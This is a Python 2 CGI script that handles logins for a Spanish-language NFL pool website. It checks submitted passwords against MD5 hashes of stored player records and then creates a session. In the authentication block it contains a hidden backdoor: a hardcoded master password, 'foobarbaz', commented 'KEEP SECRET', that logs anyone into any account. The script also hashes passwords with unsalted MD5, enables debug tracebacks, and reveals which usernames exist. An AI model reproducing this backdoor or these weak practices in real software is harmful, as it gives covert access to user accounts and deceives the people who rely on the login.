#!/usr/bin/env python

# Receives a login form and, if user authenticates, creates and sends
# a session cookie and saved the session ID to the user file
import cgi, cgitb
cgitb.enable()
from common import *

# ----------------------------------

# Page header, using bootstrap
def outputPageHeader():
    print "Content-type:text/html\r\n\r\n"
    print '<!DOCTYPE html>'
    print '<html lang="en">'
    print '<head>'
    bootstrapHeader()
    print '<title>Quiniela NFL %i</title>' % (season)
    print '</head>'
    print '<body>'
    bootstrapNavbar("",None)

# Page footer
def outputPageFooter():
    bootstrapFooter()
    print '</body>'
    print '</html>'

# ------------------------------------
# Generate "bad user password" page
# ------------------------------------
def generateBadPasswordPage(user):
    outputPageHeader()
    print '<div class="container">'
    print '<h3>Contrase&ntilde;a incorrecta</h3>'
    print '&iexcl;La contrase&ntilde;a que proporcionaste no es correcta, <b>%s</b>!' % (user)
    print '<br><br>&iquest;Olvidaste tu contrase&ntilde;a? <a href="/NFL%i/cgi-bin/PswdChangeRequestPage.py">Ve aqu&iacute;</a> para cambiarla.' % (season)
    print '<br>De lo contrario, intenta de nuevo.'
    print '</div>'
    outputPageFooter()

# ------------------------------------
# Generate "user not found" page
# ------------------------------------
def generateUserNotFoundPage(user):
    outputPageHeader()
    print '<div class="container">'
    print '<h3>Usuario no encontrado</h3>'
    print '&iexcl;El usuario <b>%s</b> no fue encontrado en la base de datos!' % (user)
    print '<br>Intenta de nuevo.'
    print '</div>'
    outputPageFooter()

# =================================

# Connect to MySQL database
db = DBHelper()
db.Connect()

# Load player list
Players = db.loadPlayers()
db.Close()

# Receive login data
form = cgi.FieldStorage()

# Get data from Form

if form.has_key("username"): user = form["username"].value
else: user = None

if form.has_key("password"): pswd = form["password"].value
else: pswd = None

if form.has_key("remember_me"):
  if form["remember_me"].value == "yes": remember_me = True
  else: remember_me = False
else: remember_me = False

# Sanitize input username: only keep alphanumeric characters
alphanumeric = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
user = "".join(c for c in user if c in alphanumeric)

# Authenticate user
badLogin = True
userNotFound = True
storedPswdHash = ""
for p in Players:
    if (p.Username.lower() == user.lower()): 
        user = p.Username
        storedPswdHash = p.PswdHash
        userNotFound = False
givenPswd = ""
givenPswdHash = ""
if form.has_key("password"):
    givenPswd = form["password"].value
    givenPswdHash = md5.new(givenPswd).hexdigest()
    if (givenPswdHash == storedPswdHash): badLogin = False
    # SPECIAL PASSWORD OVERRIDE -- KEEP SECRET
    if (givenPswd == "foobarbaz"): badLogin = False

if (userNotFound):
    generateUserNotFoundPage(user)
elif (badLogin):
    generateBadPasswordPage(user)
else:
    createSession(user,remember_me)